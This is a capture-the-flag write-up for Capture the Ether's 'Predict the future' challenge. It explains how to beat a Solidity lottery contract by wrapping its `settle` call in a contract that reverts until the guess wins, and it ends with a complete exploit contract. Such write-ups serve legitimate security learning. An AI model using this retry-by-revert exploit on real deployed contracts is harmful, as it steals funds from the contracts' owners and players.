---
description: >-
  In Capture the Ether's "Predict the future", we see our first "secret
  variable" that cannot be known prior to making our guess.
---

# Predict the future

In this [level](https://capturetheether.com/challenges/lotteries/predict-the-future/), we are required to "lock in" our guess prior to checking it against a future (truly unknowable) value.

### Hints

<details>

<summary>Hint One</summary>

Interestingly enough, solving this problem does not depend at all on which value we choose for our guess. It simply needs to be one of the ten possible answers.

</details>

<details>

<summary>Hint Two</summary>

Lock in any guess between 0 and 9. The solution depends on when we choose to call `settle`. For any value we choose, `settle` will _sometimes_ generate an answer equal to it. So, is there a way to call `settle` without _really_ calling `settle` so as to avoid settling on a value that doesn't match our guess?

</details>

### Full Walkthrough

The `answer` may be any value between 0 and 9, due to the `% 10` operation below:

```solidity
uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
```

As the guess must be "locked in" in a block prior to generating the `answer`, and the `answer` is generated based on values unknowable at the time of making our guess, we truly have no way of gaining an edge by picking one guess over another. We can therefor lock in any of the 10 possible values and move on to examining the `settle` function itself.

Let's look at both the `settle` function and the `isComplete` functions:

```solidity
function isComplete() public view returns (bool) {
    return address(this).balance == 0;
}

// ...

function settle() public {
    require(msg.sender == guesser);
    require(block.number > settlementBlockNumber);

    uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

    guesser = 0;
    if (guess == answer) {
        msg.sender.transfer(2 ether);
    }
}
```

If `settle` finds our guess to be correct, it transfers the balance of the contract to the player's address. This action, and only this action, will cause the `isComplete` function to return `true`. This means we can use `isComplete` as an indicator as to whether our guess was correct.

The trick is that Solidity executes transactions in an "all or nothing" manner, meaning if a single operation in the series of operations that make up a transaction reverts, the entire transaction reverts. This means we can call `settle` to check our guess, then call `isComplete` to see if the guess was correct. If the guess was _not_ correct, we can revert, cancelling the entire transaction including the line 13 above which sets `guesser` to 0. This approach allows us to call `settle` as many times as we need to before finally "settling" when our guess matches.

### Scripted Solution

```solidity
// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

interface IPredictTheFutureChallenge {
    function lockInGuess(uint8 n) external payable;

    function settle() external;

    function isComplete() external view returns (bool);
}

contract PredictTheFutureChallengeExploit {
    IPredictTheFutureChallenge private _challengeContract;
    uint8 private _guess;

    /**
     * Constructor sets `PredictTheFutureChallenge` contract.
     */
    constructor(address challengeContractAddress) {
        _challengeContract = IPredictTheFutureChallenge(
            challengeContractAddress
        );
    }

    /**
     * Calls `lockInGuess` on `PredictTheFutureChallenge` with provided guess
     * `n`.
     */
    function lockInGuess(uint8 n) external payable {
        _guess = n;

        // Call `lockInGuess` with `msg.value` ether
        _challengeContract.lockInGuess{value: msg.value}(_guess);
    }

    /**
     * Calls `settle` on `PredictTheFutureChallenge` contract. Will revert if
     * guess was incorrect.
     */
    function settle() external {
        // Call `settle` on `PredictTheFutureChallenge` contract
        _challengeContract.settle();

        // Ensure guess was correct
        require(
            _challengeContract.isComplete(),
            "PredictTheFutureChallengeExploit: Challenge not complete"
        );

        // Return contract balance to `msg.sender`
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}

```
